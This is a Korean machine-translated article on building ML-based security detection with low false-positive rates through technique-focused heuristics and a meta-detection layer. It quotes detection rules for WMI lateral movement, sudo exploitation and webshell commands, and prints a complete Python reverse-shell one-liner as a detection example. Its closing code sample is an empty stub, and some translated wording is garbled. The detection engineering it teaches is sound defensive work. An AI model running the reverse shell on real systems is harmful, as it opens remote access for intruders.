---
title: "AI-주도 보안 운영 구조에서 낮은 거짓 양성률을 유지하는 방법"
description: ""
coverImage: "/assets/img/2024-05-20-ArchitectureofAI-DrivenSecurityOperationswithaLowFalsePositiveRate_0.png"
date: 2024-05-20 18:11
ogImage:
  url: /assets/img/2024-05-20-ArchitectureofAI-DrivenSecurityOperationswithaLowFalsePositiveRate_0.png
tag: Tech
originalTitle: "Architecture of AI-Driven Security Operations with a Low False Positive Rate"
link: "https://medium.com/towards-data-science/architecture-of-ai-driven-security-operations-with-a-low-false-positive-rate-a33dbbad55b4"
---

## 이 기사는 사이버 보안에 적용된 제품 준비 단계의 기계 학습 솔루션 구축에 대한 마인드셋을 논의합니다.

![이미지](/assets/img/2024-05-20-ArchitectureofAI-DrivenSecurityOperationswithaLowFalsePositiveRate_0.png)

지난 몇 년간, 우리가 수십 년 동안 사용해온 교육 시스템의 품위를 훼손하는 LLMs가 존재하고, AGI로부터 실재적인 공포를 느끼기 시작했음에도 불구하고, 인공 지능(AI) 시스템을 새로운 데이터 과학 도메인에 적용하는 가능성은 먼산 미래적 이정표를 달성하기 어렵고 구별되는 접근이 필요합니다.

이 기사에서는 사이버 보안에 대한 AI 적용 가능성, 대부분의 응용 프로그램이 실패하는 이유, 그리고 실제로 작동하는 방법론에 대해 개념적으로 논의합니다. 가정적으로, 제시된 접근 방식과 결론은 특히 시스템 로그로부터의 추론에 의존하는 낮은 잘못된 양성 요구 사항을 갖는 기타 응용 도메인으로 이전 가능합니다.

<!-- ui-station 사각형 -->

<ins class="adsbygoogle"
style="display:block"
data-ad-client="ca-pub-4877378276818686"
data-ad-slot="7249294152"
data-ad-format="auto"
data-full-width-responsive="true"></ins>

<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script>

정보 보안에 관련된 데이터에 머신 러닝(ML) 로직을 구현하는 방법은 다루지 않을 것입니다. 이미 다음 기사에서 코드 샘플과 함께 기능적인 구현 방법을 제공했습니다:

- 기업 보안 텔레미터의 Power Law 분포를 기반으로 한 이상 징후 탐지 엔지니어링;
- 리눅스 auditd 로그에서 TF-IDF 및 해시 인코딩으로 침입 탐지하는 셸 언어 처리;
- 시스템 로그에 대한 GPT와 유사한 모델 엔지니어링 기술 중 어떤 것이 작동하는가?

# 서명

아직도 성숙한 보안 자세의 근간이자 가장 가치 있는 구성 요소는 목표로 하는 시그니처 규칙뿐입니다. 아래에 예시로 나오는 휴리스틱은 우리 방어의 중요한 부분입니다:

<!-- ui-station 사각형 -->

<ins class="adsbygoogle"
style="display:block"
data-ad-client="ca-pub-4877378276818686"
data-ad-slot="7249294152"
data-ad-format="auto"
data-full-width-responsive="true"></ins>

<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script>

```js
parent_process == "wmiprvse.exe"
&&
process == "cmd.exe"
&&
command_includes (\\127.0.0.1\ADMIN)
```

정말이지, 이런 규칙들은 훌륭합니다. 이것은 레드 캐너리가 WMI를 통한 측면 이동 탐지를 위해 impacket과 같은 도구를 사용하여 실현할 수 있는 (간단화된) 논리의 예시일 뿐입니다. 이런 규칙을 절대 끄지 마시고 계속해서 추가해 나가세요!

하지만, 이 방법론에는 결함이 있습니다...

그래서 이러한 이유로 누구나 한번씩은 매직한 "머신 러닝"을 통해 보안 문제를 해결해 주는 솔루션에 자본, 인력, 시간 등의 자원을 투자하는 것입니다. 보통 이것은 투자 대비 수익이 낮은 토끼굴로 보입니다: (1) 보안 분석가들의 대시보드가 크리스마스 트리처럼 빛나게 되고, 상기 그림 1을 고려하세요; (2) 분석가들이 경보 피로를 느끼게 됩니다; (3) 머신 러닝 휴리스틱이 비활성화되거나 무시됩니다.

<!-- ui-station 사각형 -->

<ins class="adsbygoogle"
style="display:block"
data-ad-client="ca-pub-4877378276818686"
data-ad-slot="7249294152"
data-ad-format="auto"
data-full-width-responsive="true"></ins>

<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script>

# 일반적 vs. 특정 휴리스틱

먼저 좁은 지능과 일반적 지능의 개념에 주의를 기울이고 싶습니다. 이는 직접적으로 보안 휴리스틱에 옮겨집니다.

일반적으로, 지능은 목표를 달성하는 능력입니다. 우리는 "일반화"하고, 달성해야 할 목표에 도달하기 위해 자연선택과 유전적 인섈트에 의해 주도되는 환경에서는 결코 필요하지 않은 목표를 달성할 수 있는 능력을 갖고 있다고 여겨집니다.

일반화가 우리 종족이 세계를 정복할 수 있게 해 줬지만, 일련의 작업에서 우리보다 훨씬 뛰어난 존재들이 있습니다. 예를 들어, 계산기는 폰 노이만 같은 우리보다 똑똑한 사람이 할 수 있는 산술보다 훨씬 더 잘 할 수 있으며, 다람쥐들 (!)은 작년에 숨겨둔 도토리의 위치를 기억하는 데 사람보다 훨씬 뛰어날 수 있습니다.

<!-- ui-station 사각형 -->

<ins class="adsbygoogle"
style="display:block"
data-ad-client="ca-pub-4877378276818686"
data-ad-slot="7249294152"
data-ad-format="auto"
data-full-width-responsive="true"></ins>

<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script>

![Architecture of AI-Driven Security Operations with a Low False Positive Rate](/assets/img/2024-05-20-ArchitectureofAI-DrivenSecurityOperationswithaLowFalsePositiveRate_1.png)

보안 휴리스틱에 대해 이야기할 수 있습니다. 특정 도구나 CVE에 중점을 둔 규칙들과 더 넓은 기법 집합을 감지하려는 규칙들이 있습니다. 예를 들어, CVE-2019–14287을 악용한 sudo 권한 상승에만 집중한 이 감지 로직을 살펴봅시다.

```js
CommandLine|contains: ' -u#'
```

반면에, 웹쉘 감지 규칙(가려진 형태로 복제됨)은 상당히 넓은 논리를 구현하려고 시도합니다.

<!-- ui-station 사각형 -->

<ins class="adsbygoogle"
style="display:block"
data-ad-client="ca-pub-4877378276818686"
data-ad-slot="7249294152"
data-ad-format="auto"
data-full-width-responsive="true"></ins>

<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script>

ParentImage|endswith:

- '/httpd'
- '/nginx'
- '/apache2'
  ...

&&
Image|endswith:

- '/whoami'
- '/ifconfig'
- '/netstat'

보안 위협을 시각화하기 위해 감지 규칙을 공격적 기법, 도구 및 절차(TTP)의 랜드스케이프에 매핑하는 더 세밀한 행위 휴리스틱을 정의합니다. 위에 있는 인텔리전스 랜드스케이프와 유사하게, 다음과 같이 선언 규칙을 공격적 기법, 도구 및 절차(TTPs)의 랜드스케이프에 매핑하여 보안 포지션을 시각화할 수 있습니다:

<img src="/assets/img/2024-05-20-ArchitectureofAI-DrivenSecurityOperationswithaLowFalsePositiveRate_2.png" />

<!-- ui-station 사각형 -->

<ins class="adsbygoogle"
style="display:block"
data-ad-client="ca-pub-4877378276818686"
data-ad-slot="7249294152"
data-ad-format="auto"
data-full-width-responsive="true"></ins>

<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script>

# False-Positives vs. False-Negatives

슈도 CVE 규칙은 특정 기술 하나만 감지하고 다른 것을 놓치므로 (극히 높은 거짓 부정률) 거짓 음성 비율이 매우 높습니다. 반면에 웹 쉘 규칙은 Kali Linux 아카이브의 공격 기술 및 웹 쉘 도구 세트를 감지할 수 있습니다.

명백한 질문은 - 그렇다면, 왜 우리는 여러 넓은 행동 규칙으로 모든 가능한 TTP를 다루지 않는 것일까요?

왜냐하면 그것들은 거짓 양성을 가져오기 때문입니다... 정말 많이요.

<!-- ui-station 사각형 -->

<ins class="adsbygoogle"
style="display:block"
data-ad-client="ca-pub-4877378276818686"
data-ad-slot="7249294152"
data-ad-format="auto"
data-full-width-responsive="true"></ins>

<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script>

여기서는 잘못된 긍정 대 잘못된 부정의 트레이드 오프를 관찰합니다.

대부분의 기관은 sudo CVE 규칙을 복사하여 SIEM에서 즉시 활성화할 수 있지만, 웹쉘 규칙은 보안 분석가가 환경에서 관찰된 모든 합법적인 트리거를 걸러내는 동안 "모니터 전용" 모드로 작동할 수 있습니다.

시스템 관리자가 생성한 자동화 알림을 볼 수 있습니다. 이 알림은 REST API 요청을 실행하고 열거 액션 중 하나를 트리거하는지 또는 배포될 때 이상한 부모-자식 프로세스 관계를 만드는 Ansible 셸 스크립트를 실행합니다. 결국 광범위한 행동 규칙이 열 두 가지 제외와 한 달에 두 번 이상의 수정을 통해 목록으로 전환되는 것을 관찰했습니다. 그래서 보안 엔지니어는 규칙의 범위 사이에서 균형을 유지합니다. 일반화의 확대는 비용이 많이든다는 것과 잘못된 긍정의 비율을 최소화하려고 노력합니다.

# 보안 휴리스틱으로서의 기계 학습 실패

<!-- ui-station 사각형 -->

<ins class="adsbygoogle"
style="display:block"
data-ad-client="ca-pub-4877378276818686"
data-ad-slot="7249294152"
data-ad-format="auto"
data-full-width-responsive="true"></ins>

<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script>

여기 보안 전문가들이 행동 휴리스틱을 구현하는 대체 기술을 찾기 시작합니다. 머신러닝 구현의 요구 사항은 선행적으로 넓습니다. 머신러닝 알고리즘의 적용 가능성을 고려할 때 대부분의 경우 보안 전문가들의 직관은 비지도 학습으로 이끕니다. 우리는 AI에게 네트워크에서 이상을 감지하고, 이상한 명령 라인에 대해 경고하는 등의 작업을 요청합니다. 이러한 작업은 "나를 위해 보안을 해결해줘"라는 일반화 수준에 있습니다. 생산에서 잘 작동하지 않는 것이 놀라운 부분입니다.

실제로 많은 경우 ML은 정확히 우리가 요청한 대로 수행합니다. 예를 들어 IntelliJ가 자신을 업데이트하는 데 사용하는 이상한 elevator.exe 이진 파일을 보고할 수도 있으며, Spotify가 업데이트를 위해 사용하는 새로운 CDN에 대한 경고 또한 동일하게 Command and Control 콜백과 똑같이 랜덤하게 지연될 수 있습니다. 그리고 그 날에 이상했던 수백 가지 유사한 행동들.

감독 학습의 경우에는 대규모의 레이블이 지정된 데이터 집합을 구성할 수 있는 경우(예: 악성 코드 탐지), EMBER와 같이 일반화가 잘 되는 모델링 체계를 구축할 수 있습니다.

그러나 이러한 솔루션들에서도 — 정보 보안의 현대적인 AI 모델조차 아직 "회색" 영역을 파악하기에 충분한 컨텍스트를 보유하고 있지 않습니다. 예를 들어, TeamViewer를 나쁜 것인지 좋은 것인지 고려해야 하는가? 많은 중소기업이 저렴한 VPN으로 사용하고 있습니다. 동시에 이러한 소규모 기업 중 일부는 이러한 도구를 사용하여 대상 네트워크에 백도어로 접근하는 랜섬웨어 그룹일 수도 있습니다.

<!-- ui-station 사각형 -->

<ins class="adsbygoogle"
style="display:block"
data-ad-client="ca-pub-4877378276818686"
data-ad-slot="7249294152"
data-ad-format="auto"
data-full-width-responsive="true"></ins>

<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script>

# 머신 러닝이 보안 휴리스틱으로 성공한 사례

ML 기반 휴리스틱은 rule-based detection과 같은 이념을 따라야 합니다. 악의적인 TTP 집합에 초점을 맞추어야 합니다. 보안에 AI를 적용하려면 실제로 보안에 대한 지식과 직관이 필요하며, 데이터 과학자분들께 죄송하지만요. ¯\_(ツ)\_/¯ 적어도 오늘날에는 LLM이 다른 많은 작업에 이어 해결할 수 있는 폭넓은 일반화를 달성할 때까지 보안 문제를 해결할 수 있습니다.

예를 들어, 명령줄에서 이상을 요청하는 대신 (이에 관한 결과가 이 글의 상단 그림 1에 표시된 것처럼 겸손한 크기의 데이터셋에서 634개의 이상으로 나타나는 것), 특정 공격 기법 주변의 베이스라인을 벗어난 활동을 요청해보세요. 즉, 이상한 Python 실행 (T1059.006)을 요청하고 바로 알아내세요! – 동일한 ML 알고리즘, 전처리 및 모델링 기술에 따르면, 실제로 Python 반전 셸인 유일한 이상을 발견할 수 있습니다:

![image](/assets/img/2024-05-20-ArchitectureofAI-DrivenSecurityOperationswithaLowFalsePositiveRate_3.png)

<!-- ui-station 사각형 -->

<ins class="adsbygoogle"
style="display:block"
data-ad-client="ca-pub-4877378276818686"
data-ad-slot="7249294152"
data-ad-format="auto"
data-full-width-responsive="true"></ins>

<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script>

Unix에 중점을 둔 비지도 학습 기법 예시:

- 이상한 python/perl/ruby 프로세스 (스크립팅 인터프리터를 통한 실행, T1059.006);
- 이상한 systemd 명령어 (systemd 프로세스를 통한 영속성, T1543.002);
- 고 심각도 점프박스로의 이상한 ssh 로그인 출처 (T1021.004).

Windows에 중점을 둔 비지도 학습 기법 예시:

- 도메인 컨트롤러, MSSQL 서버에 로그인한 사용자의 이상 (T1021.002);
- NTDLL.DLL을 로드하는 이상한 프로세스 (T1129);
- 이상한 RDP 클라이언트 및 서버 조합과의 네트워크 연결 (T1021.001).

<!-- ui-station 사각형 -->

<ins class="adsbygoogle"
style="display:block"
data-ad-client="ca-pub-4877378276818686"
data-ad-slot="7249294152"
data-ad-format="auto"
data-full-width-responsive="true"></ins>

<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script>

기능적인 지도 학습 기준 예시:

- Reverse shell 모델: 알려진 방법을 활용하여 데이터셋의 악성 부분을 생성하십시오 (이와 같은 생성기에서 영감을 받으세요); 환경 텔레메트리에서 프로세스 생성 이벤트를 사용하여 데이터셋의 합법적인 대응물로 활용하십시오.
- 강력한 속임수에 대한 규칙을 머릿속에 만드는 대신, 아래의 그림 5에 나온 것과 같이 속임수에 대한 견고성을 고려한 별도의 기계 학습 모델을 구축하십시오 (스포일러: 성공할 수 없습니다). Mandiant의 이 주제에 대한 좋은 기사가 있습니다.

![이미지](/assets/img/2024-05-20-ArchitectureofAI-DrivenSecurityOperationswithaLowFalsePositiveRate_4.png)

# 기계 학습은 서명 논리의 확장입니다

<!-- ui-station 사각형 -->

<ins class="adsbygoogle"
style="display:block"
data-ad-client="ca-pub-4877378276818686"
data-ad-slot="7249294152"
data-ad-format="auto"
data-full-width-responsive="true"></ins>

<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script>

위의 예시들을 체계적으로 정리하면, ML 휴리스틱을 성공적으로 적용하는 데에는 다음 두 단계가 포함됩니다:

- 특정 TTP에서 생성된 텔레메트리를 가능한 정확하게 포착할 수 있도록 입력 데이터를 좁힌 후;
- 비정상 활동을 찾기 위해 가능한 한 적은 차원을 정의합니다 (예: 프로세스 이미지만 볼 수 있는 논리는 부모 프로세스 이미지와 프로세스 인수를 추가로 볼 때보다 경보를 적게 발생시킵니다).

위의 단계 1은 사실 시그니처 규칙을 생성하는 방법입니다.

웹 셸 규칙을 활성화하기 전 "보안 분석가들이 환경을 대표하는 모든 트리거를 걸러낸다"고 이전에 얘기한 것을 기억하나요? 이것이 단계 2입니다.

<!-- ui-station 사각형 -->

<ins class="adsbygoogle"
style="display:block"
data-ad-client="ca-pub-4877378276818686"
data-ad-slot="7249294152"
data-ad-format="auto"
data-full-width-responsive="true"></ins>

<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script>

과거 사례에서 어떤 사람이 정당한 활동과 악의적인 활동 사이의 의사 결정 경계를 구축합니다. 사실 현대 ML 알고리즘은 여기에 정말 강합니다. ML 휴리스틱은 특정 TTP 주변의 대규모 정당한 활동을 수동으로 걸러내는 부담을 줄일 수 있습니다. 따라서 ML은 더 많은 작업 없이 시그니처 규칙보다 넓은 휴리스틱을 구축할 수 있게 합니다.

# 스위스 치즈 모델

이제 우리는 종합적인 비전을 개요로 설명할 준비가 되었습니다.

전통적인 탐지 엔지니어링 접근 방식은 SOC 대시보드가 넘치지 않도록 가능한 많은 시그니처 규칙을 쌓는 것입니다. 이러한 각 규칙은 높은 거짓 부정률 (FNR)을 가지지만 낮은 거짓 양성률 (FPR)을 가집니다.

<!-- ui-station 사각형 -->

<ins class="adsbygoogle"
style="display:block"
data-ad-client="ca-pub-4877378276818686"
data-ad-slot="7249294152"
data-ad-format="auto"
data-full-width-responsive="true"></ins>

<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script>

우리는 ML 휴리스틱을 계속 쌓아갈 수 있습니다. 이때 FPR에 대한 요구 사항은 낮아야 합니다. 왜냐하면 유일한 병목 현상을 보호해야 하기 때문입니다: 인간 분석가의 주의력입니다. ML 휴리스틱은 보안 엔지니어의 시간 자원을 크게 고갈시키지 않고 더 일반적인 행동 논리를 도입함으로써 규칙 기반 감지의 틈을 메울 수 있습니다.

만약 대부분의 낮은 hanging fruits를 다루었고 행동 분석에 더 깊게 집중하고 싶다면, 현재 활용 중인 것 위에 딥 러닝 논리를 추가할 수 있습니다.

![ML heuristics](/assets/img/2024-05-20-ArchitectureofAI-DrivenSecurityOperationswithaLowFalsePositiveRate_5.png)

Occam의 면도날 원리를 기억하고, 가능한 간단하게 모든 새로운 휴리스틱을 구현하세요. 신호 규칙이 신뢰할 수 있는 기준선을 정의할 수 없는 경우에만 ML을 사용하십시오.

<!-- ui-station 사각형 -->

<ins class="adsbygoogle"
style="display:block"
data-ad-client="ca-pub-4877378276818686"
data-ad-slot="7249294152"
data-ad-format="auto"
data-full-width-responsive="true"></ins>

<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script>

예를 들어, 이전에 언급한 이상한 Python 실행과 관련해 — Python 아규먼트는 여전히 환경 내에서 너무 다양할 수 있어서 너무 많은 이상 활동에 대한 경고를 받을 수 있습니다. 더 좁혀서 특정해야 할 수도 있습니다. 예를 들어, 명령줄에 -c가 포함된 프로세스만 캡처하여 Python 바이너리에 인수로 전달된 코드를 찾는 경우에 사용할 수 있습니다. 따라서, 이러한 Python 역술술에만 집중하는 방법을 고려해볼 수 있습니다:

```js
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

FPR을 감소시키면 False-Negative가 증가합니다. 따라서, 특이한 이름을 가진 스크립트로부터 Python 실행을 놓칠 수 있습니다. 예를 들어, python fake_server.py와 같이 사용자가 도용한 가짜 서비스를 사용하는 공격자들이 사용할 수 있는 스크립트입니다. 이를 위해 이러한 TTP들의 하위 집합에 중점을 둔 FPR이 낮은 별도의 휴리스틱을 만들어보는 것이 좋을 수 있습니다.

# 메타-감지 계층

<!-- ui-station 사각형 -->

<ins class="adsbygoogle"
style="display:block"
data-ad-client="ca-pub-4877378276818686"
data-ad-slot="7249294152"
data-ad-format="auto"
data-full-width-responsive="true"></ins>

<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script>

스위스 치즈 방법론을 따라도 상세한 휴리스틱을 얻게 됩니다. 보통 이러한 것들은 악의적인 의도를 나타내는 것은 아니지만 맥락에 관심이 있는 것입니다.

예를 들어, 새 소스에서 고심도 호스트로 SSH/RDP 로그인하는 것은 나쁜 것이 아닙니다(그냥 새 직원이나 워크스테이션일 수 있습니다), 또한 skilled 사용자 중에 whoami /all 실행이 일반적일 수 있습니다. 따라서 이러한 휴리스틱 모두 경보를 직접 트리거하기에 적합하지 않습니다. 그러나 두 가지의 조합은 분석가의 주의를 끌 수 있을지도 모릅니다.

이 딜레마의 해결책은 "True Positive Benigns"를 생성하는 이러한 상세한 규칙 위에 추가적인 논리를 도입하는 것입니다. 우리는 이것을 메타-감지 계층이라고 부를 수 있습니다.

![아키텍처](/assets/img/2024-05-20-ArchitectureofAI-DrivenSecurityOperationswithaLowFalsePositiveRate_6.png)

<!-- ui-station 사각형 -->

<ins class="adsbygoogle"
style="display:block"
data-ad-client="ca-pub-4877378276818686"
data-ad-slot="7249294152"
data-ad-format="auto"
data-full-width-responsive="true"></ins>

<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script>

룰 활성화 위에 적용되는 메타로직은 다양할 수 있지만 일반적으로 두 단계로 이뤄집니다:

- "그룹화": 모든 활성화를 "엔티티"별(예: 호스트, 사용자 이름, 소스 IP, 쿠키 등)로 그룹화합니다.
- 일정 기간 내의 활성화에 대한 "집계 함수"를 적용합니다.

간단하면서도 기능적인 메타 탐지 로직의 예시:

- 단일 엔티티(호스트 또는 사용자와 같은)에서 다른 룰 트리거의 수를 카운트하고, 세 시간 내에 세 가지 이상의 다른 룰이 트리거되면 보고합니다.
- 위와 동일하나, 심각성을 기준으로 룰에 가중치를 부여하고, "중요" 룰은 3으로, "중간"은 2로, "정보"는 1로 취급하여 임계값을 초과할 경우 보고합니다.

<!-- ui-station 사각형 -->

<ins class="adsbygoogle"
style="display:block"
data-ad-client="ca-pub-4877378276818686"
data-ad-slot="7249294152"
data-ad-format="auto"
data-full-width-responsive="true"></ins>

<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script>

더 정교한 방법들이 존재하는데, 저는 악성 코드 표현에 ML의 두 번째 층을 사용하는 AISec ’22 논문에 정의된 방법을 사용하고 있어요. 이들은 특정 어플리케이션과 환경에 튜닝되어야 해요. 왜냐하면 데이터 세부 정보, 텔레메트리 양 및 인프라 규모에 따라 다른 접근 방식이 필요해요. 이러한 접근 방식은 적절한 경고 한도를 유지하는 데 도움이 돼요.

# 결론

이 기사에서 우리는 시그니처 방식을 넘어서 보안 작업 무기함을 확장하는 사고 방식에 대해 논의했어요. 대부분의 구현은 보안 전문가들이 기계 학습(ML)을 통한 행동 휴리스틱에 너무 광범위한 요구 사항을 정의하기 때문에 제대로 수행하지 못했어요.

우리는 적절한 적용은 공격적인 기술, 전술 및 절차(TTPs)에 의해 이끌어져야 한다고 주장해요. 올바르게 사용될 때, ML 기술은 특정 TTP 주변의 합법적인 활동의 기준을 효율적으로 걸러내는 데 많은 인력을 절약할 수 있어요.

<!-- ui-station 사각형 -->

<ins class="adsbygoogle"
style="display:block"
data-ad-client="ca-pub-4877378276818686"
data-ad-slot="7249294152"
data-ad-format="auto"
data-full-width-responsive="true"></ins>

<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script>

성숙하고 성공적인 보안 체계는 시그니처와 행동 휴리스틱이 결합된 것으로 구성됩니다. 각각의 별도 검출 논리는 낮은 거짓 긍정률을 갖추고, 거짓 부정을 놓치지 않기 위한 제한 사항은 병렬로 여러 휴리스틱을 적용함으로써 균형을 이룹니다.

이 글에서 사용된 예시는 전통적인 보안 운영에 적용될 경우 감지 엔지니어링 사례를 포함하고 있습니다. 그러나 우리는 같은 방법론이 제한적인 수정을 통해 다른 보안 응용프로그램에서도 유용할 것이라 주장합니다. 예를 들어, EDR/XDR 휴리스틱 공간, 네트워크 트래픽 분석 및 계산 등이 있습니다.

# 추가 정보

## 기술 노트: 고정된 거짓 긍정률 하에서 검출률 추정

<!-- ui-station 사각형 -->

<ins class="adsbygoogle"
style="display:block"
data-ad-client="ca-pub-4877378276818686"
data-ad-slot="7249294152"
data-ad-format="auto"
data-full-width-responsive="true"></ins>

<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script>

프로덕션 환경에서 행동 ML 휴리스틱 유틸리티를 평가하는 방법에 대한 코드 샘플이 포함된 공지입니다.

데이터 과학자 여러분 — 정확도, F1-스코어 및 AUC와 같은 지표는 보안 솔루션의 프로덕션 준비 상태에 대해 거의 알려주지 않습니다. 이러한 메트릭은 여러 솔루션이 얼마나 유용한지를 추론하는 데 사용될 수 있지만 절대적인 값을 제공하지는 않습니다.

보안 텔레메트리에서 발생하는 베이스 레이트 펄러시 때문에 이렇습니다 — 기본적으로 모델이 볼 수 있는 모든 데이터는 양성 샘플들입니다 (양성 샘플이 아닌 경우를 실제로 가리킴). 따라서 심지어 0.001%의 가짜 양성률이 있더라도 휴리스틱이 매일 10,000개의 확인을 수행한다면 하루에 10건의 경보를 생성할 것입니다.

모델의 유일한 실제 가치는 고정된 가짜 양성률(FPR) 하에서의 탐지율(즉, 실제 양성률, TPR)을 살펴보는 것으로 추정됩니다.

<!-- ui-station 사각형 -->

<ins class="adsbygoogle"
style="display:block"
data-ad-client="ca-pub-4877378276818686"
data-ad-slot="7249294152"
data-ad-format="auto"
data-full-width-responsive="true"></ins>

<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script>

아래 도표를 살펴봐주세요 — x축은 데이터 샘플의 실제 레이블을 나타냅니다. 이는 악성 또는 양성일 수 있습니다. y축에는 모델의 확률적 예측이 표시됩니다 — 샘플이 얼마나 나쁜 것으로 생각하는지입니다:

![Plot](/assets/img/2024-05-20-ArchitectureofAI-DrivenSecurityOperationswithaLowFalsePositiveRate_7.png)

만약 단 하나의 잘못된 경고만 허용된다면, 모델의 결정 임계값을 약 ~0.75(파선이 그어진 빨간 선)로 설정해야 합니다. 두 번째 잘못된 긍정 값(위양성) 바로 위에 있습니다. 따라서 모델의 현실적인 감지율은 약 50%입니다 (점선이 상자그림의 평균값과 거의 일치합니다).

변경 가능한 위양성율에 따른 감지율 평가는 아래의 코드 예시로 수행할 수 있습니다:

```python
# 코드 샘플
def evaluate_detection_rates(y_true, preds):
    # 코드 구현 내용
```
